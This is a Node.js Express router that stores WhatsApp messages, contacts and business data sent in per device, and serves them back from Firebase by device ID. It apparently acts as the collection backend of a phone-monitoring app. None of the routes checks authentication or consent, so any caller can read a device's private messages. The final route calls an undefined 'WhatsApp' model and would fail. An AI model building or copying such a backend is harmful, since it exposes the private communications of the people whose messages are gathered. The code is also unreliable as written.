const express = require('express');
const router = express.Router();
const mobileFirebaseService = require('../services/mobileFirebaseService');
const { db } = require('../config/firebase');

// Store WhatsApp data directly to Firebase
router.post('/store', async (req, res) => {
    try {
        const { deviceInfo, messages, contacts, businessData } = req.body;
        
        const result = await mobileFirebaseService.storeWhatsAppData({
            deviceInfo,
            messages,
            contacts,
            businessData
        });
        
        console.log(`✅ WhatsApp data stored in Firebase for device: ${deviceInfo?.deviceId}`);
        res.json({ 
            success: true, 
            message: 'WhatsApp data stored successfully in Firebase',
            firebaseId: result.firebaseId
        });
        
    } catch (error) {
        console.error('❌ WhatsApp store error:', error);
        res.status(500).json({ success: false, message: 'Failed to store WhatsApp data in Firebase' });
    }
});

// Get WhatsApp data with pagination from Firebase
router.get('/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 50, type = 'messages' } = req.query;
        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);

        // Get the main WhatsApp document
        const whatsappQuery = await db.collection('whatsapp')
            .where('deviceId', '==', deviceId)
            .orderBy('timestamp', 'desc')
            .limit(1)
            .get();

        if (whatsappQuery.empty) {
            return res.status(404).json({ error: 'WhatsApp data not found for this device' });
        }

        const whatsappDoc = whatsappQuery.docs[0];
        const whatsappData = whatsappDoc.data();

        // Get subcollection data with pagination
        let subcollectionData = [];
        let totalCount = 0;

        if (type === 'messages') {
            const messagesQuery = await db.collection('whatsapp')
                .doc(whatsappDoc.id)
                .collection('messages')
                .orderBy('timestamp', 'desc')
                .limit(limitNum)
                .offset((pageNum - 1) * limitNum)
                .get();

            subcollectionData = messagesQuery.docs.map(doc => doc.data());
            totalCount = whatsappData.stats.totalMessages;
        } else if (type === 'contacts') {
            const contactsQuery = await db.collection('whatsapp')
                .doc(whatsappDoc.id)
                .collection('contacts')
                .orderBy('name', 'asc')
                .limit(limitNum)
                .offset((pageNum - 1) * limitNum)
                .get();

            subcollectionData = contactsQuery.docs.map(doc => doc.data());
            totalCount = whatsappData.stats.totalContacts;
        } else if (type === 'business') {
            const businessQuery = await db.collection('whatsapp')
                .doc(whatsappDoc.id)
                .collection('business')
                .orderBy('name', 'asc')
                .limit(limitNum)
                .offset((pageNum - 1) * limitNum)
                .get();

            subcollectionData = businessQuery.docs.map(doc => doc.data());
            totalCount = whatsappData.stats.totalBusinessData;
        }

        const totalPages = Math.ceil(totalCount / limitNum);

        res.json({
            success: true,
            data: {
                whatsapp: whatsappData,
                [type]: subcollectionData,
                pagination: {
                    page: pageNum,
                    limit: limitNum,
                    totalCount,
                    totalPages,
                    hasNext: pageNum < totalPages,
                    hasPrev: pageNum > 1
                }
            }
        });
        
    } catch (error) {
        console.error('❌ WhatsApp get error:', error);
        res.status(500).json({ success: false, message: 'Failed to get WhatsApp data' });
    }
});

// Get all WhatsApp data
router.get('/', async (req, res) => {
    try {
        const whatsappData = await WhatsApp.find({})
            .sort({ timestamp: -1 })
            .limit(100);
        
        res.json({ success: true, data: whatsappData });
        
    } catch (error) {
        console.error('❌ WhatsApp get all error:', error);
        res.status(500).json({ success: false, message: 'Failed to get WhatsApp data' });
    }
});

module.exports = router; 